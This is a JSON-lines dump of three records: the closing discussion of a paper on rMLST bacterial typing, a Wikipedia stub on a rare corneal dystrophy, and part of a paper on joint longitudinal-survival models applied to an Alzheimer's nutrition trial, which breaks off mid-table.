BIGS[db]{.smallcaps} platform is rapid -- *de novo* sequence assembly of short-read data for most bacterial genomes can be achieved in 1--2 h using current modest computing resources, and this will improve as longer read lengths become routine. Uploading these to the database and allele identification takes about a minute in total to obtain a complete rMLST profile. Provided comparable isolates are present within the database, accurate typing for most species can then be performed instantaneously.\n\nThere remains much debate about the bacterial species concept ([@r18]), and indeed whether bacterial 'species' meaningfully exist ([@r15]). As increasing quantities of data are accumulated, it is becoming clear that the majority of bacterial types, assigned variously to groups, genera, species, etc. on the basis of phenotypic properties, mostly represent clusters of sequence diversity, with areas of vacant sequence space between them ([@r18]). This uneven landscape of bacterial diversity, however, includes some clusters that remain distinct from their close relatives and are of recent evolutionary divergence ([@r48]). These small differences can have marked and stable phenotypic consequences, as exemplified by single-clone pathogens such as *B. anthracis*, *Y. pestis* and *Neisseria gonorrhoeae*. These pathogens have emerged recently, and although genetically very similar to non-pathogenic members of the same genus, their stable phenotypic properties render them biologically distinct from their close relatives and warrant distinct names ([@r1]). Ultimately, the work of systematic microbiology will continue to be the association of particular phenotypes with given genetic types, and this requires many factors to be taken into account, with the assignment of clusters to named groups on the basis of sequence divergence alone unlikely to be completely satisfactory ([@r43]). The low number of genomes currently available for type strains is also problematic for robust species identification, although this issue will naturally improve over time. The clusters of sequences identified with rMLST data provide a universally applicable dataset around which descriptions of bacterial diversity can be assembled, complementing methods such as whole-genome hybridization ([@r55]), which is not a practical approach for certain data, such as those obtained in metagenomic studies ([@r51]).\n\nHere we show the resolution that rMLST can achieve from the whole-domain level down to the subspecies level for the *S. pneumoniae* PMEN1 clone. Independently of the clustering algorithm used, rMLST data assigned bacteria to groups that were in agreement with the current family, order and genus designations ([Figs 1](#f1){ref-type=\"fig\"} and [2](#f2){ref-type=\"fig\"}, and Supplementary Fig. S2). Further, rMLST replicated the inter- and intra-species relationships of streptococcal isolates established by MLST and MLSA ([@r5]; [@r14]) approaches ([Figs 3](#f3){ref-type=\"fig\"} and [4](#f4){ref-type=\"fig\"}) and these groups were robust to the high levels of genetic exchange seen in these bacteria. Within *S. pneumoniae*, isolates belonging or closely related to the major disease-associated clones, as identified by the PMEN ([@r41]), were easily distinguished, with a high degree of resolution among isolates within the PMEN-1 clone ([@r10]), at least equivalent to that obtained with MLST ([Fig. 5](#f5){ref-type=\"fig\"}). Thus in an era of expanding sequencing capacity, rMLST represents a portable and efficient means of interpreting whole-genome data for clinical and other purposes, enabling a recently assembled draft sequence to be assigned to strain level rapidly and unambiguously. Not every locus will be required for every application, and the number of loci to include in an analysis will depend on the level of resolution required. For species identification, the complete sequence of any single locus is likely to be sufficient, whereas for strain-level typing, a subset will be necessary depending on the species. For monomorphic species such as *Y. pestis* and *B. anthracis*, all *rps* loci would be used, although this will be insufficient for fine-resolution typing (Supplementary Fig. S3); however, rMLST is implemented through BIGSdb which is entirely compatible with other finetyping schemes such as variable-number tandem repeats (VNTR) or canonical SNP analysis ([@r31]). Conversely for highly recombinagenic species such as *Helicobacter pylori*, approximately seven loci would give a similar resolution to standard MLST (Supplementary Table S2). Within particular species some loci are more discriminatory than others, but the discriminatory loci are not the same throughout the domain. Phylogenetic analysis of distantly related members of the domain may require use of protein sequences to minimize the generation of misleading relationships due to multiple substitutions and branch attraction by extreme AT- or GC-rich genomes.\n\nThe gene-by-gene approach to population genomics adopted here has a number of advantages over methods of multiple genome comparison that rely on whole-genome alignment and multiple pairwise comparisons ([@r6]; [@r11]), or the identification of informative SNPs by mapping against a related reference genome ([@r24]). Importantly, the approach does not require closed reference genomes and is highly scalable, with the time taken to analyse genomes increasing linearly with the number of genomes and loci included. Furthermore, the reanalysis of existing allele designations is not required as further data are added, and since the units of analysis are single genes, genomic data can be analysed irrespective of the size of the assembled contiguous sequences, or contigs, provided most loci are encompassed within a single contig, which we have shown is usually the case for protein-encoding genes in the data analysed here. The approach is also robust with respect to missing data in incomplete datasets, which makes it particularly suitable for the analysis of data generated with the current generation of parallel sequencing technologies, which have short read lengths, resulting in genome assemblies comprising multiple contigs. As allele identification is performed by the comparison of a single gene from an isolate against the entire known diversity of that locus, the method can be used to analyse highly divergent isolates, including those from different species or genera. The approach can be applied to any sequence string, either nucleotide or peptide, and multiple strings (loci) can be flexibly grouped into any number of 'schemes', each of which is equivalent to an MLST scheme ([@r30]).\n\nIn conclusion, the 53 *rps* genes represent a core genome that is sufficiently conserved across the whole domain to form the basis of a combined taxonomic and typing scheme, yet contains sufficient diversity for high-resolution isolate characterization. The relationships among isolates obtained with rMLST data are independent of the clustering algorithm used and robust to horizontal genetic exchange. Additional advantages of using the *rps* genes include their distribution in several chromosomal locations and the fact that they are protein-encoding, enabling the interpretation of their diversity with a variety of evolutionary models. Furthermore, the ribosome occupies the interface between genotype and phenotype that is a required focus of microbiology in the post-genomic era of research. For many or most clinical purposes, rMLST data will provide not only definitive but complete typing information, although in the BIGS[db]{.smallcaps} system these data can be readily supplemented with complementary typing schemes, if further resolution is required. The rMLST approach is a natural extension of the very successful use of the 16S rRNA gene for microbial taxonomy ([@r58]), with the advantages of being multilocus and containing higher levels of discrimination. The adoption of this approach is not a panacea that will in itself resolve the many issues of nomenclature and typing that are inherent in the cataloguing of the extensive diversity of the bacterial domain; however, as was the case with MLST at the bacterial species and genus level, rMLST will provide a universal reference point that can complement existing methods to assist in the rational interpretation of patterns of bacterial diversity.\n\nM.\u200aC.\u200aJ.\u200aM. is a Wellcome Trust Senior Research Fellow.\n\nThree supplementary figures, five supplementary tables, and a supplementary data file of amino acid sequence alignments in Fasta format are available with the online version of this paper.\n", "meta": {"pile_set_name": "PubMed Central"}}
{"text": "Subepithelial mucinous corneal dystrophy\n\nSubepithelial mucinous corneal dystrophy (SMCD) is a rare form of corneal dystrophy. It was first described in 1993 by Feder et al. Anterior to Bowman layer, deposits of glycosaminoglycan were detected and identified as chondroitin-4-sulfate and dermatan sulfate.\n\nReferences\n\nExternal links \n\nCategory:Disorders of sclera and cornea", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "Background {#Sec1}\n==========\n\nAlzheimer's disease (AD) is a neurodegenerative disorder characterised by a slow progressive deterioration of cognitive capacity. The pathophysiological changes begin long before clinical manifestations of the disorder, and the disease spectrum spans from clinically asymptomatic to severely impaired \\[[@CR1]\\]. The terminology of prodromal AD designates the initial mild state of cognitive impairment, whereas the dementia state represents the subsequent clinically manifest severe cognitive impairment. The specific transition between prodromal AD and the clinical diagnosis of AD dementia can be challenging \\[[@CR2]\\] as AD should not be viewed with discrete and defined clinical stages, but as a multifaceted process moving along a biological and clinical continuum \\[[@CR1]\\]. Given this underlying continuum, the moment of receiving the dementia diagnosis does not represent a discrete biological event. Nonetheless, having received the dementia diagnosis does indicate a certain level of disease progression. As such, the event 'AD dementia diagnosis' has been used in many studies that focus on risk factors, see for example: \\[[@CR3]--[@CR5]\\], and has obvious impact on patient care.\n\nProdromal AD trials frequently collect the time until clinical dementia diagnosis in combination with longitudinal patient information. These longitudinal patient information include clinical biomarkers or performance of patients in psychometric tests and can help to describe or understand disease progression. Yet, most studies dealing with longitudinal and survival (i.e., time-to-event) data analyse the data separately, mostly by relying on well-established statistical methods such as linear mixed models for longitudinal data and Cox proportional hazard models for survival data. However, a method that allows the simultaneous modelling of longitudinal measurements with a survival outcome is the joint model for longitudinal and survival data, see for example: Wulfsohn & Tsiatis (1997) \\[[@CR6]\\], Henderson et al. (2000) \\[[@CR7]\\], Tsiatis & Davidian (2004) \\[[@CR8]\\] and Rizopoulos (2012) \\[[@CR9]\\]. By combining the longitudinal and survival data into a single statistical model, joint models can account for or infer the dependencies between the two types of data. In certain situations, e.g., when it is of interest to study the association between a clinical biomarker or cognitive measure over time and the time until clinical diagnosis, a joint modelling approach is even required. More specifically, when it is of interest to study the association between a survival outcome and an endogenous time-varying covariate, such as a biomarker or another covariate measured on patients during the study, the traditional Cox model is not appropriate \\[[@CR10], [@CR11]\\]. First approaches to fit joint models have focused on the so-called two-stage methods, in which as a first step, a model is fit to the longitudinal data, and as a second step, the fitted longitudinal values are inserted in the Cox model. Many authors, such as Dafni & Tsiatis (1998) \\[[@CR12]\\], Tsiatis & Davidian (2001) \\[[@CR13]\\] and Sweeting & Thompson (2011) \\[[@CR10]\\], have shown that the two-stage method still provides potentially biased and inefficient estimates. In comparison, the joint model simultaneously estimates the parameters in the longitudinal and survival parts of the model, for example by relying on maximum likelihood estimation.\n\nJoint modelling is an active area in biostatistics with numerous methodological papers (within AD research, see for example: \\[[@CR14]--[@CR17]\\]) and has already been adopted in several clinical research fields such as cancer \\[[@CR18], [@CR19]\\] and cardiovascular disease \\[[@CR20], [@CR21]\\]. However hands-on introductions for clinicians are still limited. This paper aims to provide an introduction into the application of joint models, motivated by data from a prodromal AD trial: the LipiDiDiet trial \\[[@CR22]\\].\n\nThe LipiDiDiet trial is a randomised controlled trial, with the objective of assessing the effect of medical nutrition (Souvenaid) on cognitive functioning in patients with prodromal AD. The active component of Souvenaid is Fortasyn Connect, a specific nutrient combination designed to address nutritional requirements in the presence of AD pathology \\[[@CR23]\\]. In the paper on the LipiDiDiet trial's main results, longitudinally measured variables of cognition and time to dementia diagnosis were analysed separately. In the LipiDiDiet trial the effect on the longitudinally measured primary endpoint related to cognition did not reach significance in the primary model, while in secondary models significance was reached. In addition, benefits were seen on longitudinal measures of cognition and function, and brain atrophy measures, which were secondary outcome measures in the trial \\[[@CR22]\\]. A worsening of cognition is among the criteria for AD dementia diagnosis \\[[@CR24]\\]. One could hypothesise that an intervention that is effective in decreasing or preventing cognitive decline would also prevent or delay the clinical diagnosis. In this paper we show how we can use joint models to optimally utilise the relationship between the longitudinal information and the event times in order to gain understanding into the process of how an intervention affects disease progression. In doing so, the application of joint models reveals relevant information about the strength and the type of the associations between the longitudinal measures of cognition and the risk of an event. Moreover, we investigate the effect of differences in baseline characteristics on study outcome. Using a joint model, we can disentangle baseline confounding from the intervention effect. Throughout the analysis of the data at hand, we aim to introduce and illustrate the major steps in a joint modelling approach for the non-statistical reader.\n\nMethods {#Sec2}\n=======\n\nLipiDiDiet trial {#Sec3}\n----------------\n\nThe LipiDiDiet trial is a 24-month randomised, controlled, double-blind, multi-centre trial, performed at 11 study sites across different countries. The goal of the LipiDiDiet trial was to investigate the effects of Fortasyn Connect on cognition and related measures in prodromal AD patients. For this purpose, several longitudinal measures of cognitive functioning were recorded. In this paper we include two of them: the Clinical Dementia Rating sum of boxes (CDR-SB) and memory domain from a neuropsychological test battery (NTB memory domain).\n\nThe CDR-SB score reflects global clinical impression and ranges from a score of 0 to 18, with a higher score indicating a worse status. It is obtained through a semi-structured interview of patients and informants, summing scores of cognitive functioning on each of the following domain box scores: memory, orientation, judgement and problem solving, community affairs, home and hobbies, and personal care.\n\nNTB memory domain is a composite z-score based on Consortium to Establish a Registry for AD (CERAD) 10-word list learning immediate recall, CERAD 10-word delayed recall, and CERAD 10-word recognition. A higher z-score indicates a better memory.\n\nIndividual patients' scores were measured at baseline, where randomisation to either the test or control group took place, as well as around months 12 and 24 with an additional visit around 6 months for NTB memory domain. At each visit it was recorded whether patients had received the diagnosis of dementia. Progression to dementia was diagnosed according to criteria defined by DSM-IV, the National Institute of Neurological and Communicative Disorders and Stroke, and the AD and Related Disorders Association criteria for AD.\n\nIn this article, we focus on AD dementia as a specific form of dementia. The study sample consisted of 311 patients (modified intention-to-treat population in the LipiDiDiet main paper \\[[@CR22]\\]), of whom 57 (36%) patients in the control group and 62 (41%) in the test group had received the AD dementia diagnosis. The median follow-up times were respectively 1.96 years in the control, and 1.94 years in the test group. Despite the randomisation procedure, a statistically significant difference between the intervention groups was found in baseline Mini--Mental State Examination (baseline MMSE, p=0.039, two-sided t-test), reflecting baseline cognitive performance. The higher baseline MMSE score in the control group denotes better performance and suggests a lower risk of receiving the dementia diagnosis in this group at baseline. Figure\u00a0[1](#Fig1){ref-type=\"fig\"} displays the histograms of baseline MMSE scores in the test and control group. For further information regarding the LipiDidiet trial, including information on the randomisation procedure, we refer to the LipiDiDiet main paper \\[[@CR22]\\]. Fig. 1Histograms of Mini-Mental State Examination at baseline for the test and control group. The test group contains more values at the lower end of the histogram\n\nMethodology for the standard joint model {#Sec4}\n----------------------------------------\n\nAs the name suggests, a joint model for longitudinal and survival data consists of a longitudinal sub-model and a survival sub-model. The longitudinal sub-model is typically a mixed effects model aiming to describe the shapes of the patient-specific longitudinal profiles. For continuous longitudinal data, linear mixed models can take into account that repeated measurements from the same patient may be more correlated than measurements from other patients, by including not only fixed effects but also patient-specific random effects. For background information on mixed models, we refer to Verbeke & Molenberghs (1997) \\[[@CR25]\\] and Fitzmaurice et al. (2008) \\[[@CR26]\\].\n\nIn order to formulate our longitudinal sub-model for the longitudinal trajectories, as a first step we investigated the observed longitudinal profiles for six randomly selected patients. Figures\u00a0[2](#Fig2){ref-type=\"fig\"} and [3](#Fig3){ref-type=\"fig\"} show the longitudinal profiles for respectively their CDR-SB and NTB memory domain observations; these figures show that there is a lot of variation between patients. Therefore, we allowed each patient to have its own trajectory, by incorporating patient-specific intercepts and slopes. For the average CDR-SB and NTB memory domain trajectories we used linear effects of time (*\u03b2*~1~) but more complicated functions of time such as quadratic or higher order polynomials, e.g., using splines, are also possible \\[[@CR27]\\]. We also tried trajectory functions for CDR-SB and NTB memory domain using quadratic time effects, but these were found to give similar results (results not shown). To model the effect of Fortasyn Connect, we included both a main effect of the intervention (*\u03b2*~2~) and an interaction of intervention by time (*\u03b2*~3~) in order to allow the trajectories of the intervention groups to be different over time. This is necessary, because the intervention is expected to have a gradual effect, possibly resulting in CDR-SB and NTB-memory domain levels for the test group that are worsening more slowly. Further, we included and intercept (*\u03b2*~0~) and main effects for baseline MMSE (*\u03b2*~4~) and site (*\u03b2*~5~). This resulted in the following longitudinal sub-model for the CDR-SB observations, and similarly defined for NTB memory domain $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $${}\\begin{aligned} \\text{CDR}_{i}(t) &= \\tilde{\\text{CDR}}_{i}(t) + \\varepsilon_{i}(t), \\\\ \\tilde{\\text{CDR}}_{i}(t) &\\,=\\, \\beta_{0} + \\beta_{1} t + \\beta_{2}\\text{\\texttt{fortasyn}}_{i} \\!+ \\beta_{3}\\text{\\texttt{fortasyn}}_{i} \\times t\\\\ &~~~+ \\beta_{4} \\text{\\texttt{bmmse}}_{i} + \\beta_{5} \\text{\\texttt{site}}_{i} + b_{i0} + b_{i1} t, \\\\ \\end{aligned} $$ \\end{document}$$ where CDR~*i*~(*t*) are the observed values of CDR-SB for patient *i* at actual time points *t*, and the time points at which measurements take place may vary between patients. Further *b*~*i*0~ and *b*~*i*1~ denote respectively the patient-specific intercept and slope. The longitudinal profile of observed values CDR~*i*~(*t*) is broken down in a trajectory function $\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document}$\\tilde {\\text {CDR}}_{i}(t)$\\end{document}$ and a random error term *\u03b5*~*i*~(*t*), which is assumed to be normally distributed. The trajectory function is assumed to describe the true but unobserved trajectory of the longitudinal marker, and as will be seen later, is used in the survival sub-model 'joining' the two sub-models. The main effect of the intervention, *\u03b2*~2~, denotes the difference between the intervention groups at baseline, while the interaction effect *\u03b2*~3~, describes the intervention effect over time. Fig. 2Observed longitudinal profiles for CDR-SB for six randomly selected patients. A higher CDR-SB score indicates a worsening of a patient's status Fig. 3Observed longitudinal profiles for NTB memory domain for six randomly selected patients. A lower NTB memory domain score indicates a worsening of a patient's status\n\nA common choice for the survival sub-model is a Cox model, which is used to model the hazard of experiencing the event, i.e., in this case receiving the dementia diagnosis. For background information on Cox models, see Cox (1972) \\[[@CR28]\\], Klein & Moeschberger (1997) \\[[@CR29]\\] and Therneau & Grambsch (2013) \\[[@CR30]\\]. In case the proportional hazard assumption of the Cox model is violated, alternative modelling frameworks for the survival sub-model exist, such as the accelerated failure time model \\[[@CR31]\\]. In this paper we formulated our joint model using a Cox model. Additionally, we fitted a joint model using an accelerated failure time model which gave similar findings (results not shown). In the Cox model we included the intervention as a time-independent effect, and the estimated true trajectory of the longitudinal marker as a time-varying effect. Since there can be variation across sites in how early a patient is diagnosed, we also corrected for site in the survival sub-model. The hazard *\u03bb*~*i*~(*t*) of dementia diagnosis at time *t* for patient *i* is therefore modeled using the following survival sub-model, $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $${}\\lambda_{i}(t) = \\lambda_{0}(t) \\exp \\{ \\gamma_{1}\\text{\\texttt{fortasyn}}_{i} + \\gamma_{2} \\text{\\texttt{site}}_{i} + \\alpha \\tilde{\\text{CDR}}_{i}(t) \\}, $$ \\end{document}$$ where the parameter *\u03b1* links the longitudinal process, i.e., the trajectory function $\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document}$\\tilde {\\text {CDR}}_{i}(t)$\\end{document}$, or similarly $\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document}$\\tilde {\\text {NTB}}_{i}(t)$\\end{document}$, to the survival process. More specifically, the quantity exp(*\u03b1*) denotes the hazard ratio at time *t* for a one-unit increase in the trajectory of the longitudinal marker at the same time point. Further, *\u03bb*~0~(*t*) is the baseline hazard and *\u03b3*~1~ denotes a direct effect on the survival outcome. To gain a better understanding of how the intervention affects the risk of receiving the dementia diagnosis, and to explain what we mean by a 'direct effect', we distinguish three types of coefficients. These are schematically illustrated in Fig.\u00a0[4](#Fig4){ref-type=\"fig\"}. *\u03b2* describes the intervention effect on the longitudinal marker. As indicated before, there are two types of *\u03b2's* here; *\u03b2*~2~ denoting the difference in the longitudinal outcome between the intervention groups at baseline, and *\u03b2*~3~ describing the intervention effect on the longitudinal outcome over time. Secondly, since the parameter *\u03b1* measures the effect of the longitudinal process on the survival outcome, together, *\u03b2*~3~ and *\u03b1*, quantify the time-varying intervention effect on the risk of receiving the dementia diagnosis manifesting through the longitudinal marker. The third type of parameter involving the intervention is *\u03b3*~1~ and is directly related to the risk of receiving the dementia diagnosis. Within the joint model we can therefore distinguish the direct process (Fig.\u00a0[4](#Fig4){ref-type=\"fig\"}, bottom arm), capturing the direct effect on the survival outcome, and the indirect process (Fig.\u00a0[4](#Fig4){ref-type=\"fig\"}, upper arm), in which the coefficients quantify the indirect intervention effect on the survival outcome through the longitudinal marker. Fig. 4Schematic representation of a joint model. *\u03b2*~2~ and *\u03b2*~3~ denote the constant respectively time-varying *indirect* intervention effect on the longitudinal marker, *\u03b1* is the effect of the longitudinal marker on the survival outcome and *\u03b3*~1~ is the *direct* effect on the survival outcome\n\nAs is the case for the Cox model, the intervention effect in the joint model is the hazard ratio of the test versus the control group. In particular, the total intervention effect is the hazard ratio between two generic patients, *i* in the test group (fortasyn~*i*~=1) and *i*^\u2032^ in the control group ($\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document}$\\text {\\texttt {fortasyn}}_{i'} = 0\\phantom {\\dot {i}\\!}$\\end{document}$) who do not further differ concerning other covariates. In the joint model, this hazard ratio is a combination of the indirect and direct process. For our formulated joint model the hazard ratio for the total intervention effect denotes exp{*\u03b3*~1~ +*\u03b1*(*\u03b2*~2~+*\u03b2*~3~\u00d7*t*)}, with the first part (i.e., *\u03b3*~1~), for the direct process and the latter (time-varying) for the indirect process.\n\nMethodology for investigating the baseline confounding {#Sec5}\n------------------------------------------------------\n\nThe two processes of the joint model differ in how they handle the aspect of time. The indirect process can model how an intervention effect varies over time by modelling the intervention effect in the mixed model as a divergence of trajectories. In the direct process however, we are dealing with the proportional hazard assumption of the Cox regression model meaning that the direct effect on the survival outcome is assumed to be constant over the whole period. This arm is therefore likely to capture the effects already present right at the start of the intervention period. In a situation such as this one, where the effect of the intervention on the survival outcome - manifesting through the longitudinal marker - is expected to increase gradually over time, but an effect of any possible baseline confounding on the survival outcome is expected to be immediate, the baseline confounding will for a large extent end up in the direct arm of the model. This is a very appealing property of the joint model that makes it a very effective tool to investigate and control for the effect of potential baseline confounding.\n\nMMSE, found to be significantly different at baseline, is noted to be an important predictor for outcome parameters \\[[@CR22]\\]. This suggests that, before the start of the intervention, the test group might on average have been more likely to receive the dementia diagnosis than the control group due to an imbalance of baseline characteristics. This hampers the interpretability of the results as post baseline outcomes are a combination of the intervention effect and the effect of differences already present at baseline. To investigate this, we examined whether the lower baseline MMSE scores in the test group were related to higher risks of receiving the dementia diagnosis at the start of the trial, therefore possibly counteracting the intervention effect. This required fitting an additional joint model in which we corrected for the effect of the baseline MMSE score on dementia diagnosis by including its value in the survival sub-model, given by $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $$\\begin{array}{*{20}l} {}\\lambda_{i}(t) &= \\lambda_{0}(t) \\exp \\{ \\gamma_{1}\\text{\\texttt{fortasyn}}_{i} + \\gamma_{2}\\text{\\texttt{bmmse}}_{i} + \\gamma_{3} \\text{\\texttt{site}}_{i}\\\\ &\\quad+ \\alpha \\tilde{\\text{CDR}}_{i}(t) \\}. \\end{array} $$ \\end{document}$$\n\nWe will illustrate how the coefficients of this extended joint model can be an effective tool to investigate and control for the effect of potential baseline confounding using the CDR-SB data from the LipiDiDiet trial.\n\nNaturally, apart from being a useful property in investigating possible baseline confounding, the combination of an immediate (direct) and a progressive (indirect) effect helps us to understand the process by which the intervention affects the risk of dementia diagnosis.\n\nMethodology for investigating the association between the longitudinal and survival process {#Sec6}\n-------------------------------------------------------------------------------------------\n\nAnother aspect of the process by which the intervention affects the timing of dementia diagnosis is determined by the type of the association between the longitudinal and the survival process. The joint model defined in the previous section is the standard joint model and assumes that the value of the longitudinal outcome at any time *t* is related to the risk of an event at the same time point. However, the underlying relationship between the two processes could have a more complex nature. Examples of longitudinal characteristics possibly related to dementia diagnosis, are the current value, the stability at the current moment, the history of the longitudinal profile up to now or combinations of these characteristics \\[[@CR9]\\]. For demonstration purposes we compared joint models that vary with respect to the type of association that is assumed between the longitudinal data i.e, NTB memory domain, and the survival process i.e., timing of dementia diagnosis. We investigated whether, given the current value of NTB memory domain, the rate of change (i.e., the slope) contains any additional information on the risk of receiving a dementia diagnosis. More specifically, the slope indicates by how much the NTB memory domain for a particular patient is increasing or decreasing at a specific time point. This required fitting a joint model in which we included the slope of NTB memory domain as an additional term in the survival sub-model, given by $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $$\\begin{array}{*{20}l} {}\\lambda_{i}(t) &= \\lambda_{0}(t) \\exp \\{ \\gamma_{1}\\text{\\texttt{fortasyn}}_{i} + \\gamma_{2}\\text{\\texttt{bmmse}}_{i} + \\gamma_{3} \\text{\\texttt{site}}_{i} \\\\& \\quad+ \\alpha_{1} \\tilde{\\text{NTB}}_{i}(t) + \\alpha_{2} \\text{\\texttt{slope}}_{i}(t) \\}, \\end{array} $$ \\end{document}$$\n\nwhere the slope of NTB memory domain is obtained by taking the derivative of the trajectory function, consisting of the fixed and random effects, that is, $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $${}\\text{\\texttt{slope}}_{i}(t) = \\frac{d}{dt}{\\tilde{\\text{NTB}}}_{i}(t) = \\beta_{1} + \\beta_{3} \\text{\\texttt{fortasyn}}_{i} + b_{i1}. $$ \\end{document}$$ The parameter *\u03b1*~1~ has the same interpretation as the parameter *\u03b1* before, and the parameter *\u03b1*~2~ measures the association between the slope of the NTB memory domain trajectory and the risk of an event at the same time point, holding $\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document}$\\tilde {\\text {NTB}}_{i}(t)$\\end{document}$ constant. Using this joint model, two patients with the same level of NTB memory domain at the current moment do not necessarily have to be at equal risk of receiving the dementia diagnosis. For example, if one patient's NTB memory domain level is decreasing very rapidly while another patient's NTB memory domain level is remaining constant, it might be more realistic to assume that the first patient has a higher risk of receiving the dementia diagnosis than the latter - although they have the same value at the current moment.\n\nA similarity between this joint model and the standard joint model, is that the risk of an event at the current moment is related to characteristics of the trajectory at that same time point only. However, the risk of receiving the dementia diagnosis may not depend solely on the level of NTB memory domain or its rate of change at the current moment, but it might also be related to the history of the NTB memory domain levels. That is, two patients with the same characteristics at the current moment are not necessarily at the same risk of receiving a dementia diagnosis if their history of NTB memory domain levels were very different. One approach to take the history of NTB memory domain levels into account is by summarising its cumulative effect i.e., the area under the curve (AUC). The area under the curve indicates the cumulative effect of NTB memory domain values for a particular patient up to the current time point. We also investigated this type of association by fitting a joint model with the following survival sub-model $$\\documentclass[12pt]{minimal}\n                \\usepackage{amsmath}\n                \\usepackage{wasysym} \n                \\usepackage{amsfonts} \n                \\usepackage{amssymb} \n                \\usepackage{amsbsy}\n                \\usepackage{mathrsfs}\n                \\usepackage{upgreek}\n                \\setlength{\\oddsidemargin}{-69pt}\n                \\begin{document} $$\\begin{array}{*{20}l} {}\\lambda_{i}(t) &= \\lambda_{0}(t) \\exp \\{ \\gamma_{1}\\text{\\texttt{fortasyn}}_{i} + \\gamma_{2}\\text{\\texttt{bmmse}}_{i} + \\gamma_{3} \\text{\\texttt{site}}_{i}\\\\ &\\quad+ \\alpha_{3}\\text{\\texttt{AUC}}_{i}(t) \\}, \\end{array} $$ \\end{document}$$\n\nwhere *\u03b1*~3~ measures how strongly the risk of an event at time *t* is related to the cumulative effect of NTB memory domain for patient *i* by time point *t*. A possible limitation of this joint model is that it gives all past values of NTB memory domain the same weight in terms of their impact on the risk of receiving the dementia diagnosis at the current time point. This may not always be a reasonable assumption. As an alternative, a weight function can be used that places different weights at different time points, for example to give more weight to more recent values of the longitudinal marker. For information on how to use this weight function we refer to \\[[@CR9]\\].\n\nFigure\u00a0[5](#Fig5){ref-type=\"fig\"} gives a graphical representation of different ways of modelling the association, respectively using the current value, the current value plus the rate of change and the cumulative effect of the longitudinal trajectory. Fig. 5Graphical representation of different ways of modelling the association between the longitudinal and survival process. The different graphs respectively denote the current value (**a**), the current value plus the rate of change (**b**) and the cumulative effect (i.e., the AUC) of the longitudinal trajectory (**c**)\n\nAll the statistical analyses in this paper were performed with statistical software package R, using R-package **JM** \\[[@CR32]\\]. The package uses maximum likelihood for the parameter estimation and assumes right-censoring. The R code to fit the joint models can be found in the web appendix (Additional file\u00a0[1](#MOESM1){ref-type=\"media\"}).\n\nResults {#Sec7}\n=======\n\nNote that results in this paper can to some extent differ from results in the LipiDiDiet main paper \\[[@CR22]\\], since different types of models are used. In the main paper, mixed models were used that included the outcome baseline value as a covariate, according to a prespecified statistical analysis plan. In the results presented below, the mixed model approach is part of the joint models and in this mixed model approach, the outcome baseline values are included in the longitudinal trajectory. Modelling outcome baseline values as part of the trajectory is preferred in the joint model context as it maximises the amount of information that is used to estimate the association between the longitudinal data and the survival data.\n\nResults of the standard joint model {#Sec8}\n-----------------------------------\n\nParameter estimates, standard errors, and associated *p*-values for the standard joint model are presented in Tables\u00a0[1](#Tab1){ref-type=\"table\"} and [2](#Tab2){ref-type=\"table\"}a, respectively for CDR-SB and NTB memory domain. Not surprisingly, from the longitudinal sub-models we observe that the CDR-SB and NTB memory domain scores significantly worsen over time, reflected by an increase of on average 0.61 (95% CI: 0.52-0.70) per year for CDR-SB and a decrease of on average 0.10 (95% CI: 0.04-0.16) per year for NTB memory domain. For the CDR-SB score, however, we see that there is significantly less worsening over time in the test group than in the control group, with the average increase being 0.23 (95% CI: 0.10-0.37) per year less in the test group compared to the control group. Table 1Results for the standard joint model for CDR-SBa) Without baseline MMSEb) With 